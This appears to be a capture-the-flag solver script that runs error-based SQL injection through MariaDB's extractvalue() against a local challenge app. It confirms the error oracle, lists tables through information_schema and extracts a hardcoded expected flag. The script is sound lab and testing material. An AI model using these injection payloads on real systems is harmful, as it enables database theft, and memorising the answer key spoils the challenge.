#!/usr/bin/env bash
# solvers/p1_2.sh, Task 1.2 "Netero's Recipe Vault" canonical exploit.
#
# The recipe lookup route builds its query with raw string concatenation:
#   SELECT name FROM vault WHERE id='{id}'
# and surfaces the raw DBMS exception text back to the page on a query
# error. MariaDB's extractvalue() throws an XPATH syntax error whose
# message embeds (up to ~32 chars of) its second argument, so any subquery
# wrapped in extractvalue(1, concat(0x7e, (subquery))) gets its result
# smuggled into that error string, error-based extraction without ever
# seeing a normal result row.
#
# This script hardcodes no table name. It discovers it live, the way an
# attacker without source access would, and the discovery is genuinely
# simple because each challenge now has its own isolated database:
#   1. confirm the error channel leaks arbitrary attacker-chosen text
#   2. enumerate the tables in THIS challenge's own database (via
#      information_schema, filtered to database()). This floor's database
#      holds exactly one table, and no other challenge's tables are even
#      visible to this connection's restricted DB user, so the answer
#      comes back short and unambiguous, no guessing, no hardcoded name.
#   3. extract the secret from the table that discovery returned
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{100_type_error_leak}"

# leak <sql-expression>: wraps a scalar SQL expression in the
# extractvalue() oracle, sends it as the `id` param, and prints back
# whatever text MariaDB echoed inside the resulting XPATH syntax error.
leak() {
    local expr="$1"
    local payload="1' AND extractvalue(1,concat(0x7e,(${expr})))-- -"
    local resp
    resp=$(curl -s -G "${BASE}/p1/recipe" --data-urlencode "id=${payload}")
    echo "$resp" | grep -oP "XPATH syntax error: &#39;~\K[^&]*(?=&#39;)"
}

echo "[p1_2] step 1: confirm the error oracle leaks arbitrary attacker-chosen text"
canary=$(leak "'solver-canary-1234'")
echo "  id=1' AND extractvalue(1,concat(0x7e,'solver-canary-1234'))-- - -> leaked: '${canary}'"
if [[ "$canary" != "solver-canary-1234" ]]; then
    echo "[p1_2] FAIL: oracle did not echo back the canary string, sink may be broken"
    exit 1
fi
echo "  ok: the error message is a genuine read-arbitrary-text channel"

echo "[p1_2] step 2: enumerate the tables in this challenge's own database"
tables=$(leak "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()")
echo "  tables visible in database(): ${tables}"
# This floor's isolated database holds exactly one table, so the first
# (only) name discovery returns is the target. No hardcoded 'vault'.
table="${tables%%,*}"
if [[ -z "$table" ]]; then
    echo "[p1_2] FAIL: could not enumerate any table in this database"
    exit 1
fi
echo "  target table: '${table}'"

echo "[p1_2] step 3: extract the secret from the discovered table"
secret=$(leak "SELECT secret FROM ${table} LIMIT 1")
echo "  SELECT secret FROM ${table} LIMIT 1 -> '${secret}'"

if [[ "$secret" == "$FLAG" ]]; then
    echo "  ok: response contains flag: ${secret}"
    echo "[p1_2] PASS"
    exit 0
else
    echo "  FAIL: recovered value does not match the expected flag"
    echo "  expected: ${FLAG}"
    echo "  got:      ${secret}"
    echo "[p1_2] FAIL"
    exit 1
fi
